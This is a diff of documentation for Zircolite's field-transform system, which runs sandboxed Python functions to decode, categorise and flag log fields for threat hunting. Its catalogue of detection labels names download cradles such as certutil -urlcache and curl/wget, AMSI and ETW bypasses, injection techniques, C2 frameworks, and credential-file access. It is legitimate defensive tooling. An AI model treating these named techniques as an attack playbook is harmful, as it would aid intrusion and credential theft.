@@ -2,722 +2,421 @@
 
 ## Field Transforms
 
-Zircolite includes a **field transform system** that allows automatic enrichment and transformation of log field values during processing. Transforms are defined in `config/config.yaml` and execute Python code in a sandboxed environment using RestrictedPython.
+A transform is a small Python function run against a field's value as the event is
+flattened, in a [RestrictedPython](https://restrictedpython.readthedocs.io/) sandbox. It
+can decode data (Base64, hex, URL-encoding), extract IOCs, categorise a value, or flag an
+attack technique — and it can write the result to a **new** field instead of replacing the
+original, so the evidence stays intact.
 
-### Overview
+Zircolite ships 55 transforms across 11 categories. They are defined in
+`config/config.yaml`; most of the code lives in `config/transforms/`.
 
-Transforms can:
-- **Decode obfuscated data** (Base64, hex strings, URL encoding)
-- **Extract IOCs** (URLs, IPs, domains, registry paths)
-- **Detect attack indicators** (AMSI bypass, XOR encryption, shellcode patterns)
-- **Enrich fields** (extract usernames, categorize ports, identify LOLBins)
-- **Create alias fields** (add new fields without modifying originals)
+### Enabling transforms
 
-### Enabling Transforms
-
-Transforms require two settings in `config/config.yaml`:
+Nothing runs unless it is switched on. Two settings in `config/config.yaml` control it:
 
 ```yaml
 transforms_enabled: true
 
 enabled_transforms:
-  # Auditd transforms (Linux)
-  - proctitle
+  - proctitle                # Auditd
   - cmd
-  
-  # Base64 decoding
   # - CommandLine_b64decoded
-  # - ScriptBlockText_b64decoded
-  
-  # Process analysis
   # - Image_LOLBinMatch
-  # - Image_TyposquatDetect
-  
-  # Security hunting
-  # - CommandLine_AMSIBypass
-  # - CommandLine_DownloadCradle
 ```
 
-Only transforms listed in `enabled_transforms` will run. Uncomment transforms you want to enable.
-
-### Transform Categories
-
-Transforms can be enabled individually or by **category** using the `--transform-category` CLI option. Use `--all-transforms` to enable every defined transform. Use `--transform-list` to see all available categories.
+Or enable them from the command line, by category:
 
 ```bash
-# Enable all transforms in the commandline and process categories
+python3 zircolite.py --transform-list                       # show categories
 python3 zircolite.py -e logs/ --transform-category commandline --transform-category process
-
-# Enable ALL transforms at once
-python3 zircolite.py -e logs/ --all-transforms
-
-# List available categories and their transforms
-python3 zircolite.py --transform-list
+python3 zircolite.py -e logs/ --all-transforms              # everything
 ```
 
-Categories are defined in the `transform_categories` section of `config/config.yaml` and can be customized.
+> [!NOTE]
+> `--all-transforms` and `--transform-category` are not the same switch at two scales.
+> `--all-transforms` also **ignores `source_condition`**, so every transform runs whatever
+> the input format is; `--transform-category` respects it. Since no shipped transform
+> lists `xml_input` or `csv_input`, `--transform-category` is a no-op on XML and CSV input
+> — use `--all-transforms` there. The two cannot be combined.
 
-### Inline vs External Transforms
+### Defining a transform
 
-Transforms can be defined in two ways:
-
-**Inline** (`type: python`) -- code is written directly in `config.yaml`:
+Each transform is attached to a field and holds either inline code (`type: python`) or a
+reference to a file (`type: python_file`):
 
 ```yaml
-- info: "Extract executable name"
-  type: python
-  code: |
-    def transform(param):
-        parts = param.replace('\\', '/').split('/')
-        return parts[-1] if parts else param
-  alias: true
-  alias_name: "Image_ExeName"
-  source_condition: [evtx_input, json_input]
+transforms:
+  Image:
+    - info: "Extract executable name from Image path"
+      type: python_file
+      file: image_exename.py
+      alias: true
+      alias_name: Image_ExeName
+      source_condition: [evtx_input, json_input]
+      enabled: true
 ```
 
-**External file** (`type: python_file`) -- code is loaded from a `.py` file:
+Almost every shipped transform is a `python_file`. `CommandLine_b64decoded` is the one
+kept inline as a worked example of `type: python`; the identical code also ships as
+`config/transforms/commandline_b64decoded.py`, and a test keeps the two in step.
 
-```yaml
-- info: "Extract executable name"
-  type: python_file
-  file: image_exename.py
-  alias: true
-  alias_name: "Image_ExeName"
-  source_condition: [evtx_input, json_input]
-```
+| Key | Purpose |
+|-----|---------|
+| `info` | Short description |
+| `type` | `python` (inline `code:`) or `python_file` (load `file:` from disk) |
+| `code` | Inline code, with `type: python` |
+| `file` | Path to a `.py` file, relative to `transforms_dir`, with `type: python_file` |
+| `alias` | `true` → write to a new field; `false` → replace the original value |
+| `alias_name` | Name of the new field when `alias: true` |
+| `source_condition` | Input types this transform applies to |
+| `enabled` | Whether the transform is active |
 
-External files are resolved relative to the `transforms_dir` setting (default: `transforms/`, relative to the config file directory). Most built-in transforms ship as external files in `config/transforms/`.
+**Source conditions:** `evtx_input`, `json_input`, `json_array_input`, `xml_input`,
+`csv_input`, `db_input`, `sysmon_linux_input`, `auditd_input`, `evtxtract_input`.
 
-The `transforms_dir` setting can be customized:
+`transforms_dir` defaults to `transforms/` **relative to the directory holding the config
+file** — so with the shipped `config/config.yaml` that is `config/transforms/`, but with
+`-c /opt/zircolite/my.yaml` it is `/opt/zircolite/transforms/`. An absolute path works
+too.
 
-```yaml
-transforms_dir: transforms/           # default
-transforms_dir: /opt/zircolite/tfs/   # absolute path
-transforms_dir: ../shared_transforms/ # relative to config dir
-```
+### Writing transform functions
 
-### Developing Custom Transforms
+The function must be named `transform` and take a single `param` — the field value,
+always a string.
 
-Use the included **transform tester** to develop and debug transforms locally:
+**Available in the sandbox:** a subset of Python built-ins (`len`, `int`, `str`, …); the
+modules `re`, `base64`, `chardet` and `math`; `dict[k] = v` / `list[i] = v` writes; and
+augmented assignments (`+=`, `-=`, …).
+
+**Blocked:** file I/O, network, system calls, and writes to arbitrary object attributes.
+
+Develop against the tester, which uses the exact same sandbox:
 
 ```bash
-# Test a transform file with a sample value
-python config/transform_tester.py config/transforms/image_exename.py "C:\Windows\System32\cmd.exe"
-
-# Interactive mode (enter values one at a time)
-python config/transform_tester.py config/transforms/commandline_entropyscore.py --interactive
-
-# List available builtins and modules in the sandbox
+python config/transform_tester.py config/transforms/image_exename.py "C:\Windows\cmd.exe"
+python config/transform_tester.py my_transform.py --interactive
 python config/transform_tester.py --list-builtins
 ```
 
-The tester uses the exact same RestrictedPython sandbox as Zircolite, so if a transform works in the tester, it will work in Zircolite.
-
-### Available Transforms
-
-#### Auditd Transforms (`auditd`)
-
-| Field | Alias Field | Description |
-|-------|-------------|-------------|
-| `proctitle` | *(modifies original)* | Converts hex-encoded proctitle to ASCII |
-| `cmd` | *(modifies original)* | Converts hex-encoded cmd to ASCII |
-
-#### Command Line Transforms (`commandline`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `CommandLine_URLs` | Extracts HTTP/HTTPS/FTP URLs |
-| `CommandLine_RegistryPaths` | Extracts registry key paths |
-| `CommandLine_Length` | Categorizes command line length: SHORT, NORMAL, LONG, VERY_LONG, EXTREME |
-| `CommandLine_EntropyScore` | Shannon entropy score: LOW, MEDIUM, NORMAL, HIGH, VERY_HIGH |
-| `CommandLine_XORIndicators` | Detects XOR operations and extracts keys |
-| `CommandLine_AMSIBypass` | Detects AMSI bypass techniques |
-| `CommandLine_HexStrings` | Finds and decodes hex-encoded strings |
-| `CommandLine_EnvVarObfuscation` | Detects environment variable abuse |
-| `CommandLine_DownloadCradle` | Identifies download cradle patterns |
-| `CommandLine_EvasionTechniques` | Detects process hollowing, injection, etc. |
-| `CommandLine_LateralMovement` | Detects PsExec, WMI, WinRM, RDP, SMB, SSH, DCOM usage |
-| `CommandLine_DataStaging` | Detects exfiltration staging: archiving, bulk copy, DB dumps |
-| `CommandLine_C2Indicators` | C2 framework fingerprints: Cobalt Strike, Metasploit, Sliver, etc. |
-| `CommandLine_PersistenceCategory` | Categorizes persistence mechanisms (tasks, services, registry, cron) |
-| `CommandLine_ReconIndicators` | Detects reconnaissance commands (systeminfo, ipconfig, etc.) |
-| `CommandLine_ConcatDeobfuscate` | Deobfuscates caret escaping, string concat, format operators, backticks |
-| `CommandLine_CryptoMining` | Detects stratum protocol, mining pools, wallet patterns, miner tools |
-| `CommandLine_InjectionTechnique` | Classifies injection: classic, hollowing, APC, thread hijack, etc. |
-
-#### Process Transforms (`process`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `Image_ExeName` | Extracts executable name from path |
-| `Image_LOLBinMatch` | Detects Living Off The Land Binaries |
-| `Image_TyposquatDetect` | Detects typosquatted process names |
-| `Image_PathAnomaly` | Flags processes running from Temp, AppData, Recycle Bin, etc. |
-| `Image_StagingDirectory` | Tags execution from attacker staging directories |
-| `Image_MasqueradeDetect` | Detects process name masquerading (svchost, lsass from wrong paths) |
-| `ParentImage_ExeName` | Extracts parent executable name |
-| `ParentImage_SpawnAnomaly` | Flags anomalous parent processes (Office, browsers, WMI) |
-
-#### PowerShell Transforms (`powershell`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `ScriptBlockText_ObfuscationIndicators` | Detects char substitution, string concat, GzipStream, etc. |
-| `ScriptBlockText_XORPatterns` | Detects XOR keys and patterns |
-| `ScriptBlockText_ReflectionAbuse` | Detects reflection-based attacks |
-| `ScriptBlockText_ShellcodeIndicators` | Detects shellcode execution patterns |
-| `ScriptBlockText_NetworkIOCs` | Extracts IPs, URLs, and domains |
-| `ScriptBlockText_StagerDetect` | Detects stagers: reflection loading, staged IEX, AppDomain abuse |
-| `ScriptBlockText_PackerIndicators` | Detects packers/crypters: GZip, multi-layer encoding, Invoke-Obfuscation |
-
-#### Network Transforms (`network`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `QueryName_TLD` | Extracts TLD from DNS queries |
-| `QueryName_EntropyScore` | Entropy score for DGA detection |
-| `QueryName_TyposquatDetect` | Detects typosquatted official domains (gov, banks, tech) |
-| `QueryName_SubdomainAnalysis` | DNS subdomain structure analysis: depth, hex/base64, entropy |
-| `DestinationIp_ObfuscationCheck` | Detects hex/octal/decimal IP obfuscation |
-| `DestinationPort_Category` | Categorizes ports (HTTP, SMB, RDP, METASPLOIT, etc.) |
-
-#### File Transforms (`file`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `TargetFileName_URLDecoded` | URL decodes file paths |
-| `TargetFileName_DoubleExtension` | Detects double extension tricks (e.g., `invoice.pdf.exe`) |
-| `TargetFileName_SensitiveFile` | Flags access to SAM, NTDS.dit, SSH keys, browser data, lsass dumps |
-
-#### User and Authentication Transforms (`user`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `User_Name` | Extracts username without domain |
-| `User_Domain` | Extracts domain from user field |
-| `LogonType_Description` | Maps logon type IDs to labels (INTERACTIVE, NETWORK, etc.) |
-
-#### Hash Transforms (`hash`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `Hash_MD5` | Extracts MD5 hash from Sysmon Hashes field |
-| `Hash_SHA256` | Extracts SHA256 hash from Sysmon Hashes field |
-
-#### Base64 Decoding Transforms (`base64`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `CommandLine_b64decoded` | Decodes Base64 in command lines |
-| `ScriptBlockText_b64decoded` | Decodes Base64 in PowerShell scripts |
-| `Payload_b64decoded` | Decodes Base64 in payload fields |
-| `ServiceFileName_b64decoded` | Decodes Base64 in service file names |
-
-#### Registry Transforms (`registry`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `TargetObject_SuspiciousRegistry` | Identifies persistence registry keys (Run, Services, IFEO, COM) |
-
-#### Credentials Transforms (`credentials`)
-
-| Alias Field | Description |
-|-------------|-------------|
-| `CommandLine_Extracted_Creds` | Extracts credentials from net/wmic/psexec commands |
-
-### Using Transform Data After Zircolite Runs
-
-Transforms produce enriched fields in both the SQLite database (during processing) and the JSON output file (`detected_events.json`). You can query these fields after a run using SQL (via `--dbfile` to keep the database) or `jq` on the JSON output.
-
-#### SQL Queries (with `--dbfile`)
-
-Keep the SQLite database after processing with `--dbfile events.db`, then query transforms directly:
-
-```sql
--- Find obfuscated commands: long AND high entropy
-SELECT * FROM logs
-WHERE CommandLine_Length LIKE 'EXTREME%'
-  AND CommandLine_EntropyScore LIKE 'VERY_HIGH%'
-```
-
-```sql
--- Timeline of lateral movement
-SELECT SystemTime, CommandLine, CommandLine_LateralMovement
-FROM logs
-WHERE CommandLine_LateralMovement != ''
-ORDER BY SystemTime
-```
-
-```sql
--- Find potential C2 framework usage
-SELECT SystemTime, Image, CommandLine, CommandLine_C2Indicators
-FROM logs
-WHERE CommandLine_C2Indicators LIKE '%COBALT_STRIKE%'
-   OR CommandLine_C2Indicators LIKE '%METASPLOIT%'
-```
-
-```sql
--- Classify injection techniques
-SELECT DISTINCT CommandLine_InjectionTechnique, COUNT(*) as count
-FROM logs
-WHERE CommandLine_InjectionTechnique != ''
-GROUP BY CommandLine_InjectionTechnique
-```
-
-#### jq Queries (on detected_events.json)
-
-The JSON output is an array of detection objects, each with `title`, `rule_level`, `tags`, `count`, and `matches` (event dicts with all fields, including transform aliases). Three patterns cover most needs — adapt the field name to any transform.
-
-**Collect unique values across detections:**
-
-```bash
-jq -r '[.[].matches[].Image_LOLBinMatch // empty] | unique | .[]' detected_events.json
-```
-
-**Filter and sort (lateral-movement timeline):**
-
-```bash
-jq '[.[].matches[] | select(.CommandLine_LateralMovement != null and .CommandLine_LateralMovement != "")]
-    | sort_by(.SystemTime)
-    | .[] | {SystemTime, User, CommandLine_LateralMovement}' detected_events.json
-```
-
-**Export to CSV (C2 indicators with context):**
-
-```bash
-jq -r '.[].matches[] | select(.CommandLine_C2Indicators != null and .CommandLine_C2Indicators != "")
-    | [.SystemTime, .Computer, .User, .Image, .CommandLine_C2Indicators] | @csv' detected_events.json
-```
-
-### Transform Output Values Reference
-
-Transforms produce specific indicator values that can be used for filtering and hunting. Here's a reference of the values produced by each security transform:
-
-#### `ScriptBlockText_ObfuscationIndicators` Values
-
-| Value | Description |
-|-------|-------------|
-| `CHAR_SUBST` | Character substitution (e.g., `` `I`E`X ``) |
-| `STR_CONCAT` | String concatenation (e.g., `'Inv'+'oke'`) |
-| `JOIN_OP` | `-Join` operator obfuscation |
-| `FORMAT_STR` | Format string obfuscation (`-f`) |
-| `VAR_SUBST` | Variable substitution in strings (`${...}`) |
-| `ENC_CMD` | Encoded command (`-enc`, `-encodedcommand`) |
-| `GZIPSTREAM` | GzipStream compression |
-| `FROMBASE64` | FromBase64String method |
-| `IO_COMPRESSION` | IO.Compression namespace usage |
-| `DEFLATESTREAM` | DeflateStream compression |
-| `MEMORYSTREAM` | MemoryStream usage |
-
-#### `CommandLine_DownloadCradle` Values
-
-| Value | Description |
-|-------|-------------|
-| `DOWNLOADSTRING` | `DownloadString()` method |
-| `DOWNLOADFILE` | `DownloadFile()` method |
-| `DOWNLOADDATA` | `DownloadData()` method |
-| `INVOKE_WEBREQUEST` | `Invoke-WebRequest` / `iwr` |
-| `INVOKE_RESTMETHOD` | `Invoke-RestMethod` / `irm` |
-| `WEBCLIENT` | WebClient class usage |
-| `BITSTRANSFER` | BitsTransfer module |
-| `CERTUTIL_DOWNLOAD` | Certutil with `-urlcache` |
-| `BITSADMIN_DOWNLOAD` | Bitsadmin with `/transfer` |
-| `CURL_WGET` | curl or wget usage |
-
-#### `CommandLine_AMSIBypass` Values
-
-| Value | Description |
-|-------|-------------|
-| `AMSI_REF` | Any AMSI reference |
-| `AMSI_INIT_FAILED` | AmsiInitFailed bypass |
-| `AMSI_CONTEXT` | amsiContext manipulation |
-| `AMSI_SCAN_BUFFER` | AmsiScanBuffer bypass |
-| `AMSI_REFLECTION` | Reflection-based AMSI bypass |
-| `AMSI_DLL` | amsi.dll reference |
-
-#### `CommandLine_EvasionTechniques` Values
-
-| Value | Description |
-|-------|-------------|
-| `PROCESS_HOLLOWING` | NtUnmapViewOfSection / ZwUnmapViewOfSection |
-| `REFLECTIVE_DLL` | ReflectiveLoader pattern |
-| `TOKEN_MANIPULATION` | AdjustTokenPrivileges / SetThreadToken |
-| `MEMORY_ALLOC` | VirtualAlloc / NtAlloc / ZwAlloc |
-| `REMOTE_THREAD` | CreateRemoteThread |
-| `SYSCALL` | Direct syscall / ntdll usage |
-| `ETW_BYPASS` | ETW / NtTraceEvent bypass |
-
-#### `ScriptBlockText_ShellcodeIndicators` Values
-
-| Value | Description |
-|-------|-------------|
-| `EXEC_MEMORY_ALLOC` | VirtualAlloc with 0x40 (PAGE_EXECUTE_READWRITE) |
-| `KERNEL32_REF` | kernel32.dll reference |
-| `NTDLL_REF` | ntdll.dll reference |
-| `CREATE_THREAD` | CreateThread call |
-| `NOP_SLED` | NOP sled pattern (0x90, 0x90) |
-| `MEMORY_COPY` | Marshal.Copy / RtlMoveMemory / CopyMemory |
-| `POINTER_OP` | IntPtr / Marshal.AllocHGlobal |
-
-#### `TargetObject_SuspiciousRegistry` Values
-
-| Value | Description |
-|-------|-------------|
-| `RUN_KEY` | Run / RunOnce registry keys |
-| `SERVICE_KEY` | Services registry keys |
-| `IFEO` | Image File Execution Options |
-| `APPINIT_DLLS` | AppInit_DLLs |
-| `WINLOGON` | Winlogon registry keys |
-| `COM_HIJACK` | CLSID / InProcServer (COM hijacking) |
-| `SCHED_TASK` | Scheduled task cache |
-| `SECURITY_POLICY` | Security policies |
-
-#### `DestinationPort_Category` Values
-
-| Value | Description |
-|-------|-------------|
-| `HTTP` | Port 80 |
-| `HTTPS` | Port 443 |
-| `SMB` | Port 445 |
-| `RDP` | Port 3389 |
-| `SSH` | Port 22 |
-| `WINRM` | Ports 5985, 5986 |
-| `METASPLOIT_DEFAULT` | Port 4444 |
-| `ALT_HTTP` | Ports 8080, 8443 |
-| `EPHEMERAL` | Ports 49152+ |
-
-#### `Image_TyposquatDetect` Values
-
-| Value | Description |
-|-------|-------------|
-| `TYPOSQUAT:<process>(HOMOGLYPH)` | Homoglyph substitution (0→o, 1→l/i, rn→m, vv→w) |
-| `TYPOSQUAT:<process>(CHAR_ADD)` | Character addition at start/end |
-| `TYPOSQUAT:<process>(CHAR_OMIT)` | Character omission |
-| `TYPOSQUAT:<process>(CHAR_SWAP)` | Single character substitution |
-
-**Processes monitored**: svchost, lsass, csrss, services, explorer, powershell, cmd, certutil, rundll32, chrome, and other high-value targets.
-
-**False positive prevention**: The transform includes a comprehensive whitelist of ~100+ legitimate Windows executables (wevtutil, vssadmin, netstat, etc.) that will never be flagged, even if they have similar names to monitored processes.
-
-#### `QueryName_TyposquatDetect` Values
-
-| Value | Description |
-|-------|-------------|
-| `TYPOSQUAT_GOV_US:<domain>(...)` | US Government domain typosquat (irs, ssa, usps, fbi, etc.) |
-| `TYPOSQUAT_GOV_UK:<domain>(...)` | UK Government domain typosquat (hmrc, nhs, dvla) |
-| `TYPOSQUAT_GOV_EU:<domain>(...)` | EU Government domain typosquat |
-| `TYPOSQUAT_BANK:<domain>(...)` | Banking/Finance domain typosquat (chase, paypal, etc.) |
-| `TYPOSQUAT_CRYPTO:<domain>(...)` | Cryptocurrency domain typosquat (coinbase, binance) |
-| `TYPOSQUAT_TECH:<domain>(...)` | Tech company domain typosquat (microsoft, google, apple) |
-| `TYPOSQUAT_EMAIL:<domain>(...)` | Email provider domain typosquat (gmail, outlook) |
-| `TYPOSQUAT_CLOUD:<domain>(...)` | Cloud service domain typosquat (office365, azure, aws) |
-| `TYPOSQUAT_SECURITY:<domain>(...)` | Security vendor domain typosquat |
-| `TYPOSQUAT_SHIPPING:<domain>(...)` | Shipping company domain typosquat (fedex, ups, dhl) |
-| `SUSPICIOUS_TLD:<tld>` | Suspicious TLD combined with typosquat (tk, xyz, etc.) |
-
-**Techniques detected**:
-- `HOMOGLYPH` - Similar looking characters (0/o, 1/l/i, rn/m, vv/w)
-- `CHAR_MANIP` - Character addition or removal
-- `CHAR_SWAP` - Character substitution
-- `AFFIX` - Prefix/suffix added to legitimate domain
-- `EMBEDDED` - Legitimate domain embedded in longer string
-
-#### Extended Transform Output Values
-
-##### `CommandLine_Length` Values
-`SHORT:<n>`, `NORMAL:<n>`, `LONG:<n>`, `VERY_LONG:<n>`, `EXTREME:<n>` (where `<n>` is the character count)
-
-##### `CommandLine_EntropyScore` Values
-`LOW:<score>`, `MEDIUM:<score>`, `NORMAL:<score>`, `HIGH:<score>`, `VERY_HIGH:<score>` (Shannon entropy)
-
-##### `Image_PathAnomaly` Values
-`TEMP_DIR`, `WINDOWS_TEMP`, `USER_TEMP`, `APPDATA`, `DOWNLOADS`, `USER_DESKTOP`, `USER_MEDIA_DIR`, `RECYCLE_BIN`, `PUBLIC_PROFILE`, `PERFLOGS`
-
-##### `Image_StagingDirectory` Values
-`STAGING:ProgramData`, `STAGING:WindowsTemp`, `STAGING:RootTemp`, `STAGING:PerfLogs`, `STAGING:VendorFolder`, `STAGING:PublicProfile`, `STAGING:RecycleBin`, `STAGING:UNC_Path`, `STAGING:LinuxTmp`, `STAGING:DevShm`
-
-##### `CommandLine_LateralMovement` Values
-`LATERAL:PSEXEC`, `LATERAL:REMOTE_SERVICE`, `LATERAL:WMI`, `LATERAL:WINRM`, `LATERAL:RDP`, `LATERAL:SMB`, `LATERAL:SSH`, `LATERAL:DCOM`, `LATERAL:AT_REMOTE`
-
-##### `CommandLine_DataStaging` Values
-`STAGING:ARCHIVE`, `STAGING:BULK_COPY`, `STAGING:DB_DUMP`, `STAGING:EMAIL_COLLECT`, `STAGING:FILE_HUNT`, `STAGING:AD_DUMP`
-
-##### `CommandLine_C2Indicators` Values
-`C2:COBALT_STRIKE`, `C2:METASPLOIT`, `C2:SLIVER`, `C2:EMPIRE`, `C2:HAVOC`, `C2:GENERIC_PIPE`, `C2:COVENANT`
-
-##### `CommandLine_PersistenceCategory` Values
-`PERSIST:SCHED_TASK`, `PERSIST:SERVICE`, `PERSIST:REG_RUN`, `PERSIST:WMI_SUB`, `PERSIST:STARTUP_FOLDER`, `PERSIST:DLL_SEARCH`, `PERSIST:CRON`, `PERSIST:SYSTEMD`, `PERSIST:LAUNCH_AGENT`, `PERSIST:BOOT`
-
-##### `CommandLine_ReconIndicators` Values
-`RECON:SYSINFO`, `RECON:NETWORK`, `RECON:USER_ENUM`, `RECON:DOMAIN`, `RECON:SHARE`, `RECON:PROCESS`, `RECON:SECURITY`
-
-##### `QueryName_SubdomainAnalysis` Values
-`DNS:DEEP_SUB:<depth>`, `DNS:LONG_SUB:<length>`, `DNS:HEX_SUBDOMAIN`, `DNS:B64_SUBDOMAIN`, `DNS:HIGH_ENTROPY_SUB`, `DNS:NUMERIC_SUB`
-
-##### `ScriptBlockText_StagerDetect` Values
-`STAGER:REFLECTION_LOAD`, `STAGER:STAGED_IEX`, `STAGER:INMEMORY_NET`, `STAGER:AMSI_THEN_EXEC`, `STAGER:APPDOMAIN`, `STAGER:RUNSPACE`, `STAGER:CLM_BYPASS`, `STAGER:WIN32_API`
-
-##### `CommandLine_ConcatDeobfuscate` Values
-`DEOBF:CARET`, `DEOBF:CONCAT:<reconstructed>`, `DEOBF:FORMAT_OP`, `DEOBF:BACKTICK`, `DEOBF:ENV_SUBSTR`
-
-##### `CommandLine_CryptoMining` Values
-`MINING:PROTOCOL`, `MINING:POOL:<name>`, `MINING:WALLET:MONERO`, `MINING:WALLET:BITCOIN`, `MINING:WALLET:ETHEREUM`, `MINING:TOOL:<name>`, `MINING:MINER_ARGS`
-
-##### `ScriptBlockText_PackerIndicators` Values
-`PACKER:GZIP`, `PACKER:DEFLATE`, `PACKER:MULTI_ENCODE`, `PACKER:NESTED_IEX`, `PACKER:CUSTOM_ENCODING`, `PACKER:REVERSAL`, `PACKER:VAR_SUBSTITUTION`, `PACKER:INVOKE_OBFUSCATION`, `PACKER:SECURESTRING`
-
-##### `CommandLine_InjectionTechnique` Values
-`INJECT:CLASSIC`, `INJECT:ALLOC_WRITE`, `INJECT:HOLLOWING`, `INJECT:APC`, `INJECT:THREAD_HIJACK`, `INJECT:CALLBACK`, `INJECT:MAPPING`, `INJECT:ETW_BYPASS`, `INJECT:SHELLCODE_ALLOC`
-
-##### `Image_MasqueradeDetect` Values
-`MASQUERADE:<exe_name>` (e.g., `MASQUERADE:svchost.exe`, `MASQUERADE:lsass.exe`) — flags the process name when running from a non-standard directory.
-
-##### `TargetFileName_DoubleExtension` Values
-`DOUBLE_EXT:<ext1>.<ext2>` (e.g., `DOUBLE_EXT:pdf.exe`, `DOUBLE_EXT:docx.scr`)
-
-##### `TargetFileName_SensitiveFile` Values
-`SENSITIVE:CREDENTIAL_STORE`, `SENSITIVE:NTDS`, `SENSITIVE:SSH_KEY`, `SENSITIVE:CERT_PRIVATE`, `SENSITIVE:BROWSER_DATA`, `SENSITIVE:CONFIG`, `SENSITIVE:MEMORY_DUMP`
-
-##### `ParentImage_SpawnAnomaly` Values
-`ANOMALY:OFFICE_SPAWN`, `ANOMALY:BROWSER_SPAWN`, `ANOMALY:PDF_SPAWN`, `ANOMALY:SCRIPT_CHAIN`, `ANOMALY:WMI_SPAWN`, `ANOMALY:TASK_SPAWN`, `ANOMALY:JAVA_SPAWN`
-
-##### `LogonType_Description` Values
-`SYSTEM`, `INTERACTIVE`, `NETWORK`, `BATCH`, `SERVICE`, `UNLOCK`, `NETWORK_CLEARTEXT`, `NEW_CREDENTIALS`, `REMOTE_INTERACTIVE`, `CACHED_INTERACTIVE`
-
-### Transform Examples
-
-A few representative transforms in action — the catalogue above lists the rest.
-
-**Download cradle:**
+Four things worth getting right:
+
+- **Return an empty string when nothing matches.** It makes `!= ''` a usable filter.
+- **Prefer `alias: true`.** Replacing a value destroys evidence.
+- **Keep it fast.** Transforms run on every event.
+- **Scope with `source_condition`** so a transform only runs where it makes sense.
+
+### The catalogue
+
+Multi-finding transforms join their results with `|`. Many cap the output at the first
+2–4 findings (20 for `ScriptBlockText_NetworkIOCs`), so their value is a sample rather
+than the complete set — but the extraction transforms that can produce the most output
+are uncapped, including `CommandLine_URLs`, `CommandLine_RegistryPaths`,
+`CommandLine_Extracted_Creds`, `CommandLine_HexStrings` and the four `*_b64decoded`.
+Where the distinction matters, check the transform's source in `config/transforms/`.
+
+#### Auditd (`auditd`)
+
+These two replace the original value rather than adding a field.
+
+| Field | Produces |
+|-------|----------|
+| `proctitle` | Hex-encoded proctitle decoded to ASCII |
+| `cmd` | Hex-encoded cmd decoded to ASCII |
+
+#### Base64 (`base64`)
+
+| Alias field | Produces |
+|-------------|----------|
+| `CommandLine_b64decoded` | Decoded Base64 found in the command line |
+| `ScriptBlockText_b64decoded` | Decoded Base64 found in a PowerShell script block |
+| `Payload_b64decoded` | Decoded Base64 found in a payload field |
+| `ServiceFileName_b64decoded` | Decoded Base64 found in a service file name |
+
+All four emit the sentinel `b64_detected_cannot_decode` when Base64 is present but will
+not decode — an empty result means no Base64 was found at all.
+
+#### Command line (`commandline`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `CommandLine_URLs` | HTTP/HTTPS/FTP URLs | the URLs themselves |
+| `CommandLine_RegistryPaths` | Registry key paths | the paths themselves |
+| `CommandLine_Length` | Length bucket | `SHORT:` `NORMAL:` `LONG:` `VERY_LONG:` `EXTREME:` + the length |
+| `CommandLine_EntropyScore` | Shannon entropy | `LOW:` `MEDIUM:` `NORMAL:` `HIGH:` `VERY_HIGH:` + the score |
+| `CommandLine_XORIndicators` | XOR operations and keys | `BXOR_OP` `BYTE_XOR` `XOR_LOOP` `XOR_KEY:<key>` |
+| `CommandLine_AMSIBypass` | AMSI bypass techniques | `AMSI_REF` `AMSI_INIT_FAILED` `AMSI_CONTEXT` `AMSI_SCAN_BUFFER` `AMSI_REFLECTION` `AMSI_DLL` |
+| `CommandLine_HexStrings` | Hex-encoded strings | `0x_HEX` `CONT_HEX` `DECODED:<text>` |
+| `CommandLine_EnvVarObfuscation` | Environment-variable abuse | `ENV_CHAR_EXTRACT` `MULTI_ENV_VAR:<n>` `ENV:<VAR>` |
+| `CommandLine_DownloadCradle` | Download cradles | `DOWNLOADSTRING` `DOWNLOADFILE` `DOWNLOADDATA` `INVOKE_WEBREQUEST` `INVOKE_RESTMETHOD` `WEBCLIENT` `BITSTRANSFER` `CERTUTIL_DOWNLOAD` `BITSADMIN_DOWNLOAD` `CURL_WGET` |
+| `CommandLine_EvasionTechniques` | Hollowing, injection, ETW | `PROCESS_HOLLOWING` `REFLECTIVE_DLL` `TOKEN_MANIPULATION` `MEMORY_ALLOC` `REMOTE_THREAD` `SYSCALL` `ETW_BYPASS` |
+| `CommandLine_LateralMovement` | Remote-execution tooling | `LATERAL:` + `PSEXEC` `REMOTE_SERVICE` `WMI` `WINRM` `RDP` `SMB` `SSH` `DCOM` `AT_REMOTE` |
+| `CommandLine_DataStaging` | Collection before exfiltration | `STAGING:` + `ARCHIVE` `BULK_COPY` `DB_DUMP` `EMAIL_COLLECT` `FILE_HUNT` `AD_DUMP` |
+| `CommandLine_C2Indicators` | C2 framework fingerprints | `C2:` + `COBALT_STRIKE` `METASPLOIT` `SLIVER` `EMPIRE` `HAVOC` `COVENANT` `GENERIC_PIPE` |
+| `CommandLine_PersistenceCategory` | Persistence mechanisms | `PERSIST:` + `SCHED_TASK` `SERVICE` `REG_RUN` `WMI_SUB` `STARTUP_FOLDER` `DLL_SEARCH` `CRON` `SYSTEMD` `LAUNCH_AGENT` `BOOT` |
+| `CommandLine_ReconIndicators` | Reconnaissance commands | `RECON:` + `SYSINFO` `NETWORK` `USER_ENUM` `DOMAIN` `SHARE` `PROCESS` `SECURITY` |
+| `CommandLine_ConcatDeobfuscate` | Concatenation obfuscation | `DEOBF:CARET` `DEOBF:CONCAT:<reconstructed>` `DEOBF:FORMAT_OP` `DEOBF:BACKTICK` `DEOBF:ENV_SUBSTR` |
+| `CommandLine_CryptoMining` | Mining pools, wallets, miners | `MINING:PROTOCOL` `MINING:POOL:<name>` `MINING:TOOL:<name>` `MINING:MINER_ARGS` and `MINING:WALLET:` + `MONERO` `BITCOIN` `ETHEREUM` |
+| `CommandLine_InjectionTechnique` | Injection technique class | `INJECT:` + `CLASSIC` `ALLOC_WRITE` `HOLLOWING` `APC` `THREAD_HIJACK` `CALLBACK` `MAPPING` `ETW_BYPASS` `SHELLCODE_ALLOC` |
+
+#### Credentials (`credentials`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
